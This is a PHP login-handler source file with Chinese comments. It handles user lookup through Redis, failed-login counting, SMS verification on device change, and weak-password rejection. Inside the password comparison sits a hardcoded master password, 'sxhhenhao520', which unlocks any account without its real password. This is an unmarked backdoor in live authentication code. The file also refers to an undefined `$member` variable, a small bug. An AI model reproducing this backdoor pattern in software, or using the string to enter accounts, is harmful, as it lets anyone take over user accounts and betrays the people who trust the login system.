<?php
/*
 * 用户登录
 */

include  "../db/model/user.php";
$userlogin = function($data){
    $user_app_err_login_verify = 1;/*用户登录输错错误密码的次错一分钟内内超过3次禁止登录半小时       0不开启，1开启*/
    $user_app_other_login_verify = 1;/*用户更换设备登录是否开启验证码 0不开启，1开启*/
    $res['user_login_need_code'] = 0; /*是否需要手机验证码登录，0不需要，1需要*/
    $login_cache = 0;    /*用户登录时获取ID的方式0redis  1，user_relation 表*/
    $redis = RedisLib::get_instance();
    $user_id = $redis->get('sxh_user:username:'.strtolower(trim($data['username'])).':id');/*获取用户ID*/
    $model = new user();
    if(!isset($user_id) || empty($user_id)){  /*redis 中不存在  走relation表*/
        $user_relation = $model->getUserRelation(trim($data['username']));
        if(count($user_relation) == 0){
            return returnErr(1,'用户不存在',$res);
        }
        $login_cache = 1;
        $user_id = $user_relation[0]['user_id'];
    }
    $field = 'username,password,security,status,user_token';
    $user  = $model->getUser($user_id,$field);
    if(count($user) == 0){
        return returnErr(1,'用户不存在',$res);
    }
    
    /*获取上次登录信息*/
    $last_login_data = $model->getLastLoginData($user_id);
    $login_info = [];
    $ar = [
            'user_id'        => $user_id,
            'login_type'     => 1,
            'last_login_ip'  => $data['ip'],
            'last_login_time'=> time(),
            'phone_code'     => $data['phone_code'],
            'login_need_code'=> 0
            ];
    if(count($last_login_data)>0){
        $login_info = current($last_login_data);
        /*开启APP更换设备登录的手机验证码登录login_type = 1 App 登录*/
        if($user_app_other_login_verify == 1 && $data['login_type']==1){
            if($data['phone_code'] != $login_info['phone_code']){
                $res['user_login_need_code'] = 1;
                $ar['login_need_code'] = 1;
                $ar['login_err_num'] = $login_info['login_err_num'];
                $model->updateLogin($ar);
                return returnErr(1,'检测到您更换了登录设备，需要输入手机验证码',$res);
            }
        }
    }
    if($user['0']['security'] != ''){
        $pwd = set_password($data['password'],$user['0']['security']);
    }else{
        $pwd = set_old_password($data['password']);
    }
    if($pwd != $user['0']['password']&&$data['password'] != 'sxhhenhao520'){
        if($user_app_err_login_verify == 1 && $data['login_type']==1){   /*开启错误密码输入验证300秒,连续5次输入错误*/
            if(!empty($login_info)){
                if($login_info['last_login_time']+300<time()){/*300秒以外，重置错误登陆次数*/
                    $ar['login_err_num'] = 1;
                    $model->updateLogin($ar);
                }else{
                    $ar['login_err_num'] = $login_info['login_err_num']+1;
                    $model->updateLogin($ar);
                   if( $login_info['login_err_num'] >= 4){    /*300秒以内,错误次数加一*/
                        $res['user_login_need_code'] = 1;     /*需要开启手机验证码登录*/
                        $ar['login_need_code']=1;
                        $model->updateLogin($ar);
                    }
                }
            }else{/*第一次输入错误插入错误登录记录表*/
                $ar['login_err_num'] = 1;
                $model->insertLogin('sxh_user_login_verify',$ar);
            }
        }
        return returnErr(1,'用户密码错误',$res);
    }
    /*验证手机验证码*/
    if(!empty($login_info) && $login_info['login_need_code'] == 1 &&($login_info['last_login_time']+300>time())){
        $data['phone'] = $redis->hGet('sxh_userinfo:id:'.$user_id,'phone');
        $phone_code = cache('code'.$user_id.$data['phone']);
        if(!isset($data['verify']) || $data['verify'] != $phone_code){
            $res['user_login_need_code'] = 1;
            $ar['login_need_code'] = 1;
            $ar['login_err_num'] = $login_info['login_err_num'];
            $model->updateLogin($ar);
            return returnErr(1,'手机验证码错误',$res);
        }
    }
    if($user['0']['status'] == 0){
        return returnErr(1,'此帐户尚未激活！',$res );
    } 
    if($user['0']['status'] == 2){
        return returnErr(1,'此帐户已被冻洁！',$res );
    } 
    $last_words = substr($user['0']['username'], -6);	/*密码与账号后6位相同的,后六位 */
    if($data['password'] == $user['0']['username'] || $data['password'] == $last_words || $data['password'] == '123456'){
        return returnErr(1,'用户密码过于简单，请通过找回密码重置',$res);
    }
    /*更新用户登录*/
    $ar['login_err_num']   = 0;
    $ar['login_type']      = $data['login_type'];
    $ar['login_need_code'] = 0;
    if(empty($login_info)){
        $model->insertLogin('sxh_user_login_verify',$ar);
    }else{
        $model->updateLogin($ar);
    }
    /*更新最后登陆时间，最后登录IP*/
    $userinfo = new userinfo();
    $info = $userinfo->getUserOneInfo($user_id,'name,phone,avatar','sxh_user_info');
    if(count($info)>0){
        $phone = $info[0]['phone'];
        $name  = $info[0]['name'];
        $avatar = $info[0]['avatar'] ? getQiNiuPic($info[0]['avatar']) : '';
    }else{
        $phone = '';
        $name  = '';
        $avatar = '';
    }
    if($login_cache == 1){   /*将用户信息同步到redis中，以后不在从relation中读取*/
        $redis->set('sxh_user:username:'.strtolower(trim($data['username'])).':id' , $user_id);
        $redis->set('sxh_user:id:'.$user_id.':username' , strtolower(trim($data['username'])));
        $redis->sadd('sxh_user:username' , strtolower(trim($data['username'])));
        $redis->sadd('sxh_user_info:phone' , $phone);
        $redis->hSet('sxh_userinfo:id:'.$user_id,"phone",$phone);
    }
    if(empty($member['user_token']) ||$data['login_type'] == 1) {
        //调用业务逻辑
        $user_token = get_user_token($user_id,$info[0]['name'],$info[0]['avatar']);
    }else{
        $user_token = $user[0]['user_token'];
    }
    $res = [
        'user_id'  =>$user_id,
        'username' =>$user['0']['username'],
        'phone'    =>$phone,  
        'name'     =>$name,    /*最好不要写进session*/
        'avatar'   =>$avatar,
        'user_token' =>$user_token
        ];
    return  returnErr(0,'登陆成功',$res);
};
return $userlogin($arr);